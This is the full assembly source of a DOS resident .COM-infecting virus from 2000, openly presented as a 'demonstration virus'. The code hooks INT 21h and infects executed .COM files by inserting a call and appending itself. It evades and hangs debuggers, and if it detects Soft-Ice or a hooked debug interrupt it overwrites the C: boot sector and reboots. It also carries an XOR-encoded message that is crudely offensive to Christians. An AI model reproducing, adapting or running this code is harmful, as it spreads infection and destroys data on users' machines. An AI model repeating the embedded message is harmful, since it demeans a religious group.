; Resident .COM midfile infector - 666 bytes - 02/2000 by T-2000/IR.
; Uses the INT 21h ISR to locate a suitable place to put the CALL_Virus.

                .286
                .MODEL  TINY
                .CODE

Virus_Size      EQU     (End_Body-START)
Virus_Size_Mem  EQU     (((End_Heap-START)+15)/16)

START:
                PUSHF                           ; Save registers.
                PUSHA
                PUSH    DS
                PUSH    ES

                CALL    Get_IP

;                       Encrypted with XOR 66h:
;  "If Jesus was fucked to death, all xtians would be wearing tiny dildo's"
;                    (pardon my sense of humour :)

Message         DB      6Bh, 6Ch, 2Fh, 00h, 46h, 2Ch, 03h
                DB      15h, 13h, 15h, 46h, 11h, 07h, 15h
                DB      46h, 00h, 13h, 05h, 0Dh, 03h, 02h
                DB      46h, 12h, 09h, 46h, 02h, 03h, 07h
                DB      12h, 0Eh, 4Ah, 46h, 07h, 0Ah, 0Ah
                DB      46h, 1Eh, 12h, 0Fh, 07h, 08h, 15h
                DB      46h, 11h, 09h, 13h, 0Ah, 02h, 46h
                DB      04h, 03h, 46h, 11h, 03h, 07h, 14h
                DB      0Fh, 08h, 01h, 46h, 12h, 0Fh, 08h
                DB      1Fh, 46h, 02h, 0Fh, 0Ah, 02h, 09h
                DB      41h, 15h, 6Bh, 6Ch, 61h, 66h

Get_IP:         POP     SI                      ; Calculate delta offset.
                SUB     SI, (Message-START)

                MOV     AH, 30h                 ; Get DOS version.
                INT     21h

                CMP     AL, 4                   ; We need DOS 4.xx or above.
                JB      Restore_Host

                MOV     AX, 2000h               ; Virus residency check.
                INT     21h

                XCHG    CX, AX                  ; Already up there?
                JCXZ    Restore_Host            ; Then abort further install.

                MOV     AH, 43h                 ; Soft-Ice residency check.
                INT     68h

                CMP     AX, 0F386h              ; Active?
                JZ      Trash_Boot

        ; (This works in Win32 aswell tho you have to encapsulate it
        ; with a SEH as the INT 68h will GPF if Soft-Ice ain't loaded).

Alloc_Memory:   XOR     CX, CX

Alloc_Block:    MOV     AH, 48h                 ; Attempt to allocate memory.
                MOV     BX, Virus_Size_Mem
                INT     21h
                JNC     Init_Block

                DEC     CX                      ; CX = -1
                JNP     Restore_Host            ; Endless loop?

                MOV     AH, 4Ah                 ; Get blocksize of ES.
                MOV     BX, CX
                INT     21h

                MOV     AH, 4Ah                 ; Create room for the virus.
                SUB     BX, Virus_Size_Mem+1
                INT     21h
                JNC     Alloc_Block

                JMP     Restore_Host            ; And attempt allocation.

Init_Block:     MOV     ES, AX                  ; ES = allocated block.

                DEC     AX                      ; DS = MCB allocated block.
                MOV     DS, AX

                XOR     DI, DI

                MOV     WORD PTR DS:[DI+1], 8   ; Disguise block as system.

                MOV     CX, (Virus_Size/2)      ; Copy viruscode up there.
                SEGCS
                REP     MOVSW

                PUSH    ES

                MOV     AX, 3521h               ; Get INT 21h.
                INT     21h

                PUSH    ES
                POP     DS

                MOV     AX, 2566h               ; Revector it to INT 66h.
                MOV     DX, BX
                INT     21h

                POP     DS

                MOV     Busy_Switch, CL         ; Clear busy flag.

                MOV     AL, 21h                 ; Hook INT 21h.
                MOV     DX, OFFSET New_Int21h
                INT     21h

Restore_Host:   PUSH    SS                      ; So we can STOS to SS.
                POP     ES

                MOV     BP, SP                  ; Setup stack pointer.

                MOV     DI, [BP+(11*2)]         ; CALL_Virus return address.

                SUB     DI, 3                   ; Offset of CALL_Virus.

                MOV     [BP+(11*2)], DI         ; Re-execute it later.

                MOV     AL, NOT 0C3h            ; Encrypted original byte.
Host_Byte       =       BYTE PTR $-1
                NOT     AL                      ; Decrypt byte.
                STOSB                           ; Restore byte in memory.

                MOV     AX, 9090h-1             ; Encrypted original word.
Host_Word       =       WORD PTR $-2
                INC     AX                      ; Decrypt word.
                STOSW                           ; Restore word in memory.

                POP     ES                      ; Restore original registers.
                POP     DS
                POPA
                POPF

                RETN                            ; And re-execute, fixed code.


Trash_Boot:
                MOV     AL, 2                   ; Trash the bootsector of C:.
                MOV     CX, 1
                XOR     DX, DX
                SEGCS                           ; Stupid anti-TBClean trick.
                INT     26h

                INT     19h                     ; Reboot the system.


New_Int21h:
                CMP     AX, 2000h               ; Virus residency call.
                JNE     Check_Exit

                CBW                             ; AX = 0.

                IRET                            ; And return.

Check_Exit:     PUSHA                           ; Save all regs.
                PUSH    DS
                PUSH    ES

                OR      AH, AH                  ; Program terminate?
                JZ      Check_Timer

                CMP     AH, 4Ch                 ; Program terminate?
                JNE     Check_Debugger

Check_Timer:    IN      AX, 40h                 ; Get a random value.

                ADD     AL, AH                  ; 1/256 chance of displaying
                JNZ     Check_Debugger          ; text message.

                MOV     AH, 0Eh
                MOV     SI, OFFSET Message

Display_Char:   SEGCS                           ; Fetch next encrypted byte.
                LODSB

                XOR     AL, 66h                 ; Displayed all so far?
                JZ      Check_Debugger          ; Then bail.

                INT     10h                     ; BIOS display character.

                JMP     Display_Char            ; Go on.

Check_Debugger: XOR     DI, DI

                MOV     DS, DI                  ; Get 1st instruction of
                LDS     SI, DS:[DI+(01h*4)]     ; INT 01h.
                LODSB

                MOV     AH, AL                  ; Save it in AH.

                MOV     DS, DI                  ; Get 1st instruction of
                LDS     SI, DS:[DI+(03h*4)]     ; INT 03h.
                LODSB

                XOR     AX, 0CFCFh              ; if they're not IRET then
                JNZ     Trash_Boot              ; a debugger has hooked them.

Check_Caller:   INT     01h                     ; Annoying break.

                JMP     $                       ; Bail if we're busy already.
Busy_Switch     =       BYTE PTR $-1

                INC     CS:Int_Count            ; Only examine INTs randomly
                JS      Exit_ISR                ; to prevent slowdowns.
                JP      Exit_ISR

                MOV     BP, SP
                MOV     DS, [BP+(11*2)]         ; DS = CS of calling INT 21h.

                XCHG    SI, AX                  ; SI = 0.

                CMP     DS:[SI], 20CDh          ; Verify it's a .COM-PSP.
                JNE     Exit_ISR

                ; Set the busy flag so we don't get interrupted.

                MOV     CS:Busy_Switch, (Exit_ISR-Busy_Switch)-1

                MOV     AH, 62h                 ; Get current PSP.
                INT     66h

                CMP     BX, [BP+(11*2)]         ; Caller's CS == PSP ?
                JNE     Clear_Busy              ; Else it ain't no .COM.

                IN      AX, 40h                 ; Get a random number.
                ADD     AL, AH

                CMP     AL, 150                 ; Infect the program here?
                JNB     Clear_Busy              ; Nope, maybe next time.

                MOV     DS, DS:[SI+2Ch]         ; .COM's environment block.

Scan_For_Name:  LODSW                           ; Scan for the end of all
                DEC     SI                      ; settings, after which
                                                ; the full path to the
                OR      AX, AX                  ; currently executing program
                JNZ     Scan_For_Name           ; resides.

                CALL    Infect_File

Clear_Busy:     AND     CS:Busy_Switch, 0       ; Open for business again..

Exit_ISR:       POP     ES                      ; Restore the regs.
                POP     DS
                POPA

Do_Old_Int21h:  INT     66h                     ; Call the original INT 21h.

                RETF    2                       ; And return with new flags.


Seek_EOF:
                MOV     AX, 4202h               ; Seek to the end of file.
                XOR     CX, CX
                CWD
                INT     66h

                DB      0CDh, 03h               ; Annoying break.

Do_RETN:        RETN


Infect_File:
                MOV     AX, 4300h               ; Get file's attributes.
                LEA     DX, [SI+3]
                INT     66h
                JC      Do_RETN

                IN      AL, 21h                 ; Lock the keyboard.
                OR      AL, 00000010b
                OUT     21h, AL

                INT     01h                     ; Hang the possible debugger.

                PUSH    DS                      ; Save path and attributes.
                PUSH    DX
                PUSH    CX

                AND     CL, 00000110b           ; Leave system & hidden files
                JZ      Clear_Readonly          ; alone (and clear r/o bit).

JMP_Nop_Attr:   JMP     Nop_Attr_Rest           ; Fix stack but don't restore
                                                ; attributes.

Clear_Readonly: MOV     AX, 4301h               ; Clear possible r/o bit.
                INT     66h
                JC      JMP_Nop_Attr

                MOV     AX, 3D02h               ; Open file for read/write.
                INT     66h
                JNC     Save_Handle

                JMP     Restore_Attr

Save_Handle:    XCHG    BX, AX                  ; Save filehandle in BX.

                PUSH    CS
                POP     DS

                MOV     SI, OFFSET Header

                MOV     AH, 3Fh                 ; Read first 4 bytes of .COM.
                MOV     CL, 4
                MOV     DX, SI
                INT     66h
                JNC     Verify_Read

JMP_Close_File: JMP     Close_File

Verify_Read:    CMP     AX, CX                  ; All 4 bytes we're read?
                JNE     JMP_Close_File

                CALL    Seek_EOF                ; Get filesize.

                DEC     DX                      ; .COM is over 64k ?
                JNS     JMP_Close_File          ; Then bail, obviously.

                CMP     AX, (63*1024)           ; .COM is too big?
                JA      JMP_Close_File

                CMP     AX, (4*1024)            ; Or too small?
                JB      JMP_Close_File

                INC     WORD PTR [SI+2]         ; Don't infect .SYS-files.
                JZ      JMP_Close_File

                CMP     [SI], 'ZM'+1            ; Ditto for .EXE-files.
                JE      JMP_Close_File

                CMP     [SI], 'MZ'+1
                JE      JMP_Close_File

                MOV     AX, 4202h               ; Seek to the last 7 bytes
                DEC     CX                      ; of the .COM-file, this
                MOV     DL, -7                  ; is where the possible
                INT     66h                     ; ENUNS-string is located.

        ; My Win98 .COM-files have the ENUNS changed to NLDNS, so just
        ; checking for ENUNS would not work with these. Just treath every
        ; .COM-file as a ENUNS protected file and you're all set.

                MOV     AH, 3Fh
                MOV     CX, 7
                MOV     DX, OFFSET Checksum_ID
                INT     66h

                ; Adjust the file's checksum.

                ADD     Checksum_Word, Virus_Size

                CALL    Seek_EOF

                LES     DI, [BP+(2*10)]         ; ES:DI = CS:IP of the next
                                                ; instruction in the target.

                MOV     DX, DI
                DEC     DH                      ; Minus PSP (100h).

                CMP     DX, AX                  ; IP points into the image?
                JNB     JMP_Close_File          ; Else bail out.

                SUB     AX, DX                  ; Calculate displacement.
                SUB     AX, 3

                MOV     BP, OFFSET CALL_Virus

                MOV     CS:[BP+1], AX           ; CALL_Virus displacement.

                PUSH    DX

                MOV     AX, 4200h               ; Seek to the insert offset.
                XOR     CX, CX
                INT     66h

                MOV     SI, OFFSET Header

                MOV     AH, 3Fh                 ; Read the original bytes.
                MOV     CL, 3
                MOV     DX, SI
                INT     66h

                POP     DX

                CMPSB                           ; Code in memory is the same
                JNE     Close_File              ; as on disk?

                CMPSW                           ; This avoids infecting
                JNE     Close_File              ; packed files, etc.

                SUB     SI, 3

                LODSB                           ; Get 1st byte, encrypt and
                NOT     AL                      ; save it.
                MOV     Host_Byte, AL

                LODSW                           ; Do the same with the next
                DEC     AX                      ; word.
                MOV     Host_Word, AX

                MOV     AX, 4200h               ; Seek to the insert offset
                XOR     CX, CX                  ; again.
                INT     66h

                MOV     AX, 5700h               ; Get file's date & time.
                INT     66h
                JC      Close_File

                MOV     AL, CL                  ; Mask-out seconds.
                AND     AL, 00011111b

                CMP     AL, (6/2)               ; 6 seconds (infected) ?
                JE      Close_File              ; Then abort.

                XCHG    CX, AX                  ; Put CX in AX.

                AND     AL, 11100000b           ; Clear seconds field.
                OR      AL, (6/2)               ; Set 6 seconds.

                PUSH    AX                      ; Save the file date & time
                PUSH    DX                      ; on the stack for later.

                MOV     AH, 40h                 ; Write the CALL_Virus into
                MOV     CX, 3                   ; the file.
                MOV     DX, BP
                INT     66h
                JC      Restore_Date

                CALL    Seek_EOF

                MOV     AH, 40h                 ; Append virusbody to the
                MOV     CX, Virus_Size          ; target file. (DX=0).
                INT     66h

Restore_Date:   MOV     AX, 5701h               ; Restore file date & time.
                POP     DX
                POP     CX
                INT     66h

Close_File:     MOV     AH, 3Eh                 ; Close the file.
                INT     66h

Restore_Attr:   MOV     AX, 4301h               ; Restore file's attributes.
                CMP     AX, 0
                ORG     $-2
Nop_Attr_Rest:  MOV     AH, 19h                 ; Nop (get current drive).
                POP     CX
                POP     DX
                POP     DS
                INT     66h

Exit_Infect:    CMP     AX, 545Bh               ; Executable text string,
                XOR     CH, [BX]                ; '=[T2/IR]='. Very effective
                DEC     CX                      ; against lame text patching.
                PUSH    DX
                POP     BP
                CMP     AX, 0DEADh

                IN      AL, 21h                 ; Reverse state of keyboard,
                XOR     AL, 00000010b           ; it'll lock if a debugger
                OUT     21h, AL                 ; has skipped the 1st lock.

                INT     03h                     ; Hang the possible debugger.

                RETN

CALL_Virus      DB      0E8h                    ; CALL opcode.
                DW      0

Checksum_ID     DB      5 DUP(0)                ; Usually 'ENUNS'.
Checksum_Word   DW      666                     ; Checksum itself.

End_Body:

Int_Count       DB      0
Header          DB      4 DUP(0)

End_Heap:       ; So it's lame.. a lame virus for a lame person..
                ; Haven't bothered optimizing the code structure to
                ; the max, no time nor desire, sorry.. Remember, this
                ; is just a demonstration virus....

                ; Amen.

                END     START
